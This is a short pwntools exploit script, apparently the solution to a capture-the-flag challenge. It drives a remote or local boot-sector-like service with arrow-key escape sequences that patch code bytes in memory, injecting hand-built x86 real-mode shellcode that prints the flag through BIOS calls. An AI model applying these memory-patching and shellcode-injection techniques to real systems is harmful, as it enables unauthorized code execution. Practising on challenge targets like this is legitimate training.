from pwn import *

if args.REMOTE:
    io = remote("13.201.224.182", 30157)
elif args.LOCAL:
    io = process('./run.sh')
else:
    io = remote('127.0.0.1', 10000)
    
up = b'\x1b[A'
down = b'\x1b[B'
    
def arrow_up(offset):
    io.send(p8(offset)+up)
    sleep(0.1)
def arrow_down(offset):
    io.send(p8(offset)+down)
    sleep(0.1)
    
base = 0x7C04
vic = 0x7C09
flag = 0x7dc6

pl = """
mov si, {}
loop:
    lodsb
    mov ah, 0xe
    mov bx, 7
    int 0x10
    jmp loop
end:
""".format(flag)
print(asm(pl))

org = b'\xfa\x01\xc0\x8e\xd8\x8e\xc0\x8e\xd0\xbc\xff\xff\xfb\xe8\x19'
pl  = b'\x0f\xbe\xc6\x7d\xac\xb4\x0e\x0f\xbb\x07\x00\xcd\x10\xeb\xf5'


io.recvuntil('Disk...\r\n', drop=True)

offset = vic - base + 0x30

for i in range(15):
  o = org[i]
  n = pl[i]
  if (n > o):
    for j in range(n-o):
      arrow_up(offset)
  else:
    for j in range(o-n):
      arrow_down(offset)
  offset += 1

offset = 0x5d
for j in range(0xfe-0xd7):
    arrow_down(offset)
pause()
io.send(b'\x1b')
io.interactive()
  